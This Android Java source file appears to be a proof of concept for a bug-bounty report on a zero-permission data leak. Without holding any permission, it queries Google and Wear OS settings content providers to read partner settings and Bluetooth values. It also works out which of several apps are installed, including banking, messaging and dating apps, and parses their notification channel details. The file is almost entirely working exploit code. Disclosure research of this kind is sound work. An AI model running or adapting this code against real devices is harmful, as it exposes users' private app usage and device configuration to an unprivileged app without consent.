package com.vrp.poc;

import android.app.Activity;
import android.app.NotificationChannel;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

public class WearSettingsLeakV2Activity extends Activity {
    private static final String TAG = "VRP_WEARSET2";
    private static final String WEAR_AUTHORITY = "com.google.android.wearable.settings";
    private static final String GOOGLE_SETTINGS_AUTHORITY = "com.google.settings";

    private static final String[] PROBE_PACKAGES = {
        "com.google.android.gm",
        "com.google.android.apps.messaging",
        "com.google.android.dialer",
        "com.google.android.calendar",
        "com.google.android.contacts",
        "com.google.android.keep",
        "com.google.android.apps.maps",
        "com.google.android.apps.photos",
        "com.google.android.apps.youtube.music",
        "com.google.android.apps.safetyhub",
        "com.google.android.wearable.assistant",
        "com.google.android.apps.walletnfcrel",
        "com.google.android.apps.fitness",
        "com.chase.sig.android",
        "com.paypal.android.p2pmobile",
        "com.whatsapp",
        "org.thoughtcrime.securesms",
        "com.tinder",
        "com.google.android.gms",
        "com.google.wear.services",
        "com.android.vending",
        "com.google.android.apps.wearable.settings",
        "com.fitbit.FitbitMobile",
        "com.google.android.wearable.healthservices",
        "com.google.android.apps.chromecast.app",
        "com.google.android.apps.scone",
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(9f);
        sv.addView(tv);
        setContentView(sv);

        new Thread(() -> {
            StringBuilder sb = new StringBuilder();
            sb.append("=== VRP #45 Enhanced: Zero-Permission Data Leak ===\n");
            sb.append("PoC UID: ").append(android.os.Process.myUid()).append("\n");
            sb.append("PID: ").append(android.os.Process.myPid()).append("\n\n");

            readGoogleSettings(sb);
            sb.append("\n");
            readWearGlobalSettings(sb);
            sb.append("\n");
            enumerateAppsAndChannels(sb);

            final String result = sb.toString();
            Log.i(TAG, result);
            runOnUiThread(() -> tv.setText(result));
        }).start();
    }

    private void readGoogleSettings(StringBuilder sb) {
        sb.append("--- GOOGLE SETTINGS PROVIDER (zero-perm read) ---\n");
        ContentResolver cr = getContentResolver();
        try {
            Cursor c = cr.query(
                    Uri.parse("content://" + GOOGLE_SETTINGS_AUTHORITY + "/partner"),
                    null, null, null, null);
            if (c != null) {
                int count = 0;
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndex("name"));
                    String value = c.getString(c.getColumnIndex("value"));
                    sb.append("  ").append(name).append(" = ").append(value).append("\n");
                    Log.i(TAG, "GSETTINGS: " + name + " = " + value);
                    count++;
                }
                sb.append("  Total: ").append(count).append(" settings\n");
                c.close();
            } else {
                sb.append("  NULL cursor\n");
            }
        } catch (Exception e) {
            sb.append("  ERROR: ").append(e.getMessage()).append("\n");
            Log.e(TAG, "GoogleSettings error", e);
        }
    }

    private void readWearGlobalSettings(StringBuilder sb) {
        sb.append("--- WEAR GLOBAL SETTINGS (zero-perm read) ---\n");
        ContentResolver cr = getContentResolver();
        String[] uris = {"play_store_availability", "bluetooth"};
        for (String path : uris) {
            try {
                Cursor c = cr.query(
                        Uri.parse("content://" + WEAR_AUTHORITY + "/" + path),
                        null, null, null, null);
                if (c != null) {
                    while (c.moveToNext()) {
                        String key = c.getString(0);
                        String val = c.getString(1);
                        sb.append("  ").append(key).append(" = ").append(val).append("\n");
                        Log.i(TAG, "WEARSETTING: " + key + " = " + val);
                    }
                    c.close();
                }
            } catch (Exception e) {
                sb.append("  ").append(path).append(": ERROR ").append(e.getMessage()).append("\n");
            }
        }
    }

    private void enumerateAppsAndChannels(StringBuilder sb) {
        sb.append("--- APP ENUMERATION + CHANNEL DETAILS ---\n");
        ContentResolver cr = getContentResolver();
        int installed = 0;
        int notInstalled = 0;

        for (String pkg : PROBE_PACKAGES) {
            try {
                Bundle extras = new Bundle();
                extras.putString("channel_q_package", pkg);
                Cursor c = cr.query(
                        Uri.parse("content://" + WEAR_AUTHORITY + "/notification_channels"),
                        null, extras, null);
                if (c != null && c.getCount() > 0) {
                    sb.append("  INSTALLED: ").append(pkg)
                      .append(" (").append(c.getCount()).append(" channels)\n");
                    Log.i(TAG, "INSTALLED: " + pkg + " (" + c.getCount() + " channels)");
                    installed++;

                    while (c.moveToNext()) {
                        String group = c.getString(0);
                        byte[] blob = c.getBlob(1);
                        if (blob != null) {
                            try {
                                Parcel parcel = Parcel.obtain();
                                parcel.unmarshall(blob, 0, blob.length);
                                parcel.setDataPosition(0);
                                NotificationChannel nc = NotificationChannel.CREATOR.createFromParcel(parcel);
                                sb.append("    CH: id=").append(nc.getId())
                                  .append(" name=").append(nc.getName())
                                  .append(" imp=").append(nc.getImportance())
                                  .append(" group=").append(nc.getGroup())
                                  .append(" sound=").append(nc.getSound())
                                  .append("\n");
                                Log.i(TAG, "CHANNEL_DETAIL: " + pkg
                                        + " id=" + nc.getId()
                                        + " name=" + nc.getName()
                                        + " importance=" + nc.getImportance()
                                        + " group=" + nc.getGroup()
                                        + " sound=" + nc.getSound());
                                parcel.recycle();
                            } catch (Exception pe) {
                                sb.append("    CH: raw blob ").append(blob.length)
                                  .append(" bytes (parse err: ").append(pe.getMessage()).append(")\n");
                            }
                        }
                    }
                    c.close();
                } else {
                    sb.append("  NOT INSTALLED: ").append(pkg).append("\n");
                    Log.i(TAG, "NOT_INSTALLED: " + pkg);
                    notInstalled++;
                    if (c != null) c.close();
                }
            } catch (Exception e) {
                sb.append("  ERROR: ").append(pkg).append(" - ").append(e.getMessage()).append("\n");
                notInstalled++;
            }
        }
        sb.append("  Total: ").append(installed).append(" installed, ")
          .append(notInstalled).append(" not installed out of ")
          .append(PROBE_PACKAGES.length).append(" probed\n");
    }
}
